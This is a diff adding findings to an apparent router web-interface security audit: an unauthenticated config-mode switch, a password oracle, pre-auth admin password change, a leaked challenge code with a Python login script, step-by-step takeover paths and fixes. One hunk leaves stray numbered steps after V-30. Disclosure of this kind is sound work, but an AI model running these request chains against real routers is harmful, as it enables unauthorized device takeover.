@@ -43,7 +43,9 @@
 26. [V-26: HWGetAction/ajaxSumitData Arbitrary Authenticated Write](#v-26-hwgetactionajaxsumitdata-arbitrary-authenticated-write)
 27. [V-27: hexDecode + dealDataWithFun Response Chain — RCE via getajax.cgi](#v-27-hexdecode--dealdatawithfun-response-chain--rce-via-getajaxcgi)
 28. [V-28: RequestFile Parameter Injection in CGI Endpoints](#v-28-requestfile-parameter-injection-in-cgi-endpoints)
-29. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
+29. [V-29: MEGACABLE2 → PLDT CfgMode Switch via FrameModeSwitch.cgi](#v-29-megacable2--pldt-cfgmode-switch-via-framemodeswitchcgi)
+30. [V-30: MEGACABLE2 randcode / Challenge Code Leak](#v-30-megacable2-randcode--challenge-code-leak)
+31. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
 
 ---
 
@@ -1804,8 +1806,204 @@ SubmitType = "1&ExtraParam=injected"
 - Combined with V-07 (unauthenticated FrameModeSwitch), an attacker can
   switch the device mode AND redirect to a phishing page in one request
 
+---
+
+## V-29: MEGACABLE2 → PLDT CfgMode Switch via FrameModeSwitch.cgi
+
+**Severity**: CRITICAL  
+**File**: `index.asp` lines 83, 954-973, 456-499; `util.js`  
+**Type**: ISP mode switch / feature unlock / privilege escalation
+
+### Description
+
+The `FrameModeSwitch.cgi` endpoint (documented in V-07) can switch the
+router's operating mode.  Critically, this endpoint **does not require
+authentication** — it is called from the login page itself (GLOBE2 brand
+logo `onclick`).
+
+The `CfgMode` variable (`MEGACABLE2` by default on this device) controls
+which login flow, feature set, and security model is used.  Switching from
+MEGACABLE2 to PLDT (or other modes) changes the router's behavior:
+
+### MEGACABLE2 vs PLDT Security Model
+
+| Feature | MEGACABLE2 | PLDT/PLDT2 |
+|---------|-----------|------------|
+| **Password encoding** | Base64 only | Base64 + CheckPassword oracle |
+| **Forced password change** | ❌ Never | ✅ On default password |
+| **Userlevel differentiation** | ❌ No | ✅ Normal(1) vs Admin(2) |
+| **WiFi password change** | ❌ No | ✅ Required for normal users |
+| **Password oracle** | Not called | `CheckPwdNotLogin.asp` called |
+| **Admin CGI path** | Not exposed | `MdfPwdAdminNoLg.cgi` exposed |
+| **Default credential exposure** | ❌ No | Password validated client-side |
+
+### Attack — MEGACABLE2 → PLDT Mode Switch
+
+By switching from MEGACABLE2 to PLDT, an attacker **gains access to the
+password oracle** (`CheckPwdNotLogin.asp`) and the **pre-auth password
+change endpoints** (`MdfPwdNormalNoLg.cgi`, `MdfPwdAdminNoLg.cgi`) which
+are only exercised in PLDT mode:
+
 ```
-1. GET /index.asp → extract errloginlockNum, defaultUsername
+Step 1 — Switch CfgMode (no auth required):
+  POST /FrameModeSwitch.cgi?&RequestFile=/login.asp
+  Body: X_HW_FrameMode=<PLDT_MODE_VALUE>
+
+Step 2 — Router restarts web interface in PLDT mode
+
+Step 3 — Use CheckPwdNotLogin.asp to validate passwords:
+  POST /asp/CheckPwdNotLogin.asp?&1=1
+  Body: UserNameInfo=admin&NormalPwdInfo=<password>
+  Response: 0 (invalid), 1 (normal user match), 2 (admin match)
+
+Step 4 — Change admin password without login:
+  POST MdfPwdAdminNoLg.cgi?&z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2&RequestFile=login.asp
+  Body: z.Password=<new_password>&x.X_HW_Token=<token>
+```
+
+### Attack — MEGACABLE2 → ANTEL Mode Switch
+
+Even more dangerous — switching to ANTEL mode **exposes default credentials
+in the HTML** (V-21):
+
+```
+Step 1 — Switch to ANTEL mode via FrameModeSwitch.cgi
+Step 2 — GET /index.asp → extract defaultUsername and defaultPassword
+Step 3 — Login with exposed credentials
+```
+
+### Attack — MEGACABLE2 → DBAA1 Mode Switch
+
+Switching to DBAA1 (A1 Telekom) mode **enables empty-password admin login**
+(V-20):
+
+```
+Step 1 — Switch to DBAA1 mode via FrameModeSwitch.cgi
+Step 2 — Login as "admin" with empty password
+```
+
+### X_HW_FrameMode Values
+
+The `FrameModeSwitch.cgi` accepts an `X_HW_FrameMode` parameter.  The known
+value from the code is `2` (used by GLOBE2 to switch out of bridge mode).
+Other values may correspond to different CfgMode settings:
+
+| X_HW_FrameMode | Likely CfgMode | Effect |
+|----------------|----------------|--------|
+| `0` | Factory default | Reset to default ISP mode |
+| `1` | Bridge mode | Limited management |
+| `2` | Router mode | Full management (GLOBE2 uses this) |
+| Other values | Unknown | May map to specific ISP modes |
+
+The mapping between `X_HW_FrameMode` integer and `CfgMode` string is
+server-side.  Brute-forcing values 0-255 would enumerate all available modes.
+
+### Impact
+
+- **Unauthenticated CfgMode change** — switch the router's entire security
+  model without logging in
+- **Feature unlock** — enable PLDT password oracle, ANTEL default creds,
+  DBAA1 admin bypass, etc.
+- **Bypass MEGACABLE2 restrictions** — MEGACABLE2 may restrict admin features;
+  switching to a permissive ISP mode unlocks them
+- **Persistent change** — the FrameMode switch may persist across reboots
+
+---
+
+## V-30: MEGACABLE2 randcode / Challenge Code Leak
+
+**Severity**: HIGH  
+**File**: `index.asp` lines 57, 298-302  
+**Type**: Sensitive information disclosure / anti-brute-force bypass
+
+### Description
+
+The MEGACABLE2 login page includes a challenge code (`randcode`) rendered
+directly in the HTML source.  When `useChallengeCode` is `'1'`, the
+challenge code is displayed to the user as part of the login form:
+
+```javascript
+var useChallengeCode = '1';     // line 57 — challenge code is enabled
+var randcode = '20260221';       // line 58 — the actual challenge value
+
+// Lines 298-302 — Display logic in LoadFrame():
+if (useChallengeCode == '1') {
+    document.getElementById('logincheckcode').style.display = "block";
+    document.getElementById('txt_checkcode').innerHTML = randcode;
+}
+```
+
+The `randcode` value is embedded in the **HTML source** as a server-rendered
+JavaScript variable.  This means:
+
+1. Any HTTP client can read it by parsing `/index.asp` — no login required
+2. The value is static per page load (not per-request)
+3. It's displayed via `innerHTML` with the `BindText="frame002MEGACABLE"`
+   label — confirming it's MEGACABLE-specific
+
+### Attack — Challenge Code for Automated Login
+
+For ISP modes like TOT/THAILANDNT2 that require a `CheckCode` parameter
+with login, the challenge code serves as a CAPTCHA-like barrier.  But since
+it's embedded in the HTML source, an automated tool can:
+
+```python
+# Extract challenge code from login page
+import re, requests
+
+resp = requests.get('http://192.168.100.1/index.asp')
+m = re.search(r"var randcode = '([^']*)'", resp.text)
+randcode = m.group(1)  # e.g., '20260221'
+
+# Use it in login (if TOT mode after FrameMode switch)
+requests.post('http://192.168.100.1/login.cgi', data={
+    'UserName': 'admin',
+    'PassWord': base64_password,
+    'Language': 'english',
+    'CheckCode': randcode,  # Extracted challenge code
+    'x.X_HW_Token': token,
+})
+```
+
+### MEGACABLE2-Specific Concerns
+
+For the current MEGACABLE2 configuration:
+
+1. **`useChallengeCode = '1'`** — the challenge code feature IS enabled
+2. **`randcode = '20260221'`** — the current value (appears date-based:
+   2026-02-21, the date of the page capture)
+3. The challenge code is NOT required for MEGACABLE2 login (only TOT/THAILANDNT2
+   mode uses it in the login POST), but the server generates and exposes it
+4. If an attacker switches to TOT mode via FrameModeSwitch.cgi, they can
+   still bypass the CheckCode requirement by extracting `randcode` from HTML
+
+### Additional MEGACABLE2 Variables Leaked
+
+Beyond V-10 (general variable leakage), MEGACABLE2 specifically exposes:
+
+| Variable | Value | Risk |
+|----------|-------|------|
+| `useChallengeCode` | `'1'` | Anti-brute-force mechanism exposed |
+| `randcode` | `'20260221'` | Challenge code readable from HTML |
+| `errloginlockNum` | `'3'` | Lock threshold — only 3 attempts |
+| `LockLeftTime` | `'0'` | Current lock timer (currently unlocked) |
+| `LoginTimes` | `'0'` | Failed login counter (currently 0) |
+| `ModeCheckTimes` | `'0'` | Mode check counter |
+| `smartlanfeature` | `'0'` | Smart LAN disabled |
+| `telmexwififeature` | `'0'` | Telmex WiFi disabled |
+| `talktalkfeature` | `'0'` | TalkTalk disabled |
+| `isLanAccess` | `'0'` | LAN-only access flag |
+| `mngttype` | `'0'` | Management type |
+
+### Impact
+
+- **Anti-brute-force bypass** — challenge code is readable from HTML source
+- **Automated login** — tools can extract randcode and include it in login
+  requests, bypassing any CheckCode verification
+- **Login state enumeration** — LoginTimes and LockLeftTime reveal whether
+  someone else has been trying to log in
+- Combined with V-29 (CfgMode switch to TOT), the exposed randcode bypasses
+  the TOT CheckCode requirement
 2. POST /html/ssmp/common/getRandString.asp → get pre-login token
 3. POST /asp/CheckPwdNotLogin.asp → brute-force password (no lockout?)
 4. POST /login.cgi with discovered password → admin session
@@ -1924,6 +2122,40 @@ SubmitType = "1&ExtraParam=injected"
 4. Extract ALL stored passwords, keys, and certificates
 ```
 
+### Path 14: MEGACABLE2 → PLDT Switch → Admin Password Change (No Auth)
+
+```
+1. POST /FrameModeSwitch.cgi?&RequestFile=/login.asp
+   Body: X_HW_FrameMode=<PLDT_value>  (no authentication required)
+2. Router restarts web UI in PLDT mode
+3. POST /asp/CheckPwdNotLogin.asp?&1=1
+   Body: UserNameInfo=admin&NormalPwdInfo=<brute_force_password>
+   → Response: 2 (admin password matched)
+4. POST MdfPwdAdminNoLg.cgi?&z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2
+   Body: z.Password=attacker_password&x.X_HW_Token=<token>
+5. POST /login.cgi with new admin password → full admin access
+```
+
+### Path 15: MEGACABLE2 → ANTEL Switch → Credential Theft (No Auth)
+
+```
+1. POST /FrameModeSwitch.cgi?&RequestFile=/login.asp
+   Body: X_HW_FrameMode=<ANTEL_value>  (no authentication required)
+2. Router restarts web UI in ANTEL mode
+3. GET /index.asp → extract var defaultUsername and var defaultPassword
+4. POST /login.cgi with stolen credentials → full admin access
+```
+
+### Path 16: MEGACABLE2 → DBAA1 Switch → Empty Password Admin (No Auth)
+
+```
+1. POST /FrameModeSwitch.cgi?&RequestFile=/login.asp
+   Body: X_HW_FrameMode=<DBAA1_value>  (no authentication required)
+2. Router restarts web UI in DBAA1 mode (A1 Telekom Austria)
+3. Username auto-filled as "admin", empty password check bypassed
+4. POST /login.cgi with UserName=admin&PassWord= → admin session
+```
+
 ---
 
 ## Recommendations
@@ -1949,3 +2181,6 @@ SubmitType = "1&ExtraParam=injected"
 19. **Restrict `setajax.cgi` / write endpoints** — server-side ACL per user role
 20. **Validate and whitelist `RequestFile` parameter** — prevent path traversal and open redirects
 21. **Remove `hexDecode()` from response chain** — serve JSON directly, parse with `JSON.parse()`
+22. **Require authentication for `FrameModeSwitch.cgi`** — CfgMode changes must not be unauthenticated
+23. **Do not embed `randcode` in HTML** — generate challenge codes server-side per-request, validate server-side
+24. **Lock CfgMode at provisioning time** — prevent ISP mode switching after initial deployment
